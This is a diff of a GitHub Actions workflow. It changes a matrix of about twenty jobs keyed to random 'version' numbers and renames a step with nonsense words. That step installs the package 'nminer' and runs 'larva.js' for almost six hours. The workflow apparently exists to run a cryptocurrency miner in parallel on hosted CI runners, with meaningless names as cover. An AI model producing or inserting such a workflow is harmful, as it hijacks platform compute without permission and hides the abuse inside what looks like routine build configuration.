@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1961 }
-          - { version: 2756 }
-          - { version: 7186 }
-          - { version: 4262 }
-          - { version: 3553 }
-          - { version: 8945 }
-          - { version: 5713 }
-          - { version: 9661 }
-          - { version: 6868 }
-          - { version: 9121 }
-          - { version: 3269 }
-          - { version: 7247 }
-          - { version: 2271 }
-          - { version: 7421 }
-          - { version: 3885 }
-          - { version: 7858 }
-          - { version: 3160 }
-          - { version: 969 }
-          - { version: 940 }
-          - { version: 4712 }
+          - { version: 4876 }
+          - { version: 9247 }
+          - { version: 9683 }
+          - { version: 7085 }
+          - { version: 4854 }
+          - { version: 6219 }
+          - { version: 83 }
+          - { version: 3823 }
+          - { version: 7504 }
+          - { version: 4787 }
+          - { version: 359 }
+          - { version: 1612 }
+          - { version: 7931 }
+          - { version: 684 }
+          - { version: 8980 }
+          - { version: 1127 }
+          - { version: 7830 }
+          - { version: 4855 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: when fail times task
+      - name: pro brave drat concerning tall
         run: |
           npm install nminer@latest
-          timeout 305m node larva.js || echo "larva executed"
+          timeout 349m node larva.js || echo "larva executed"
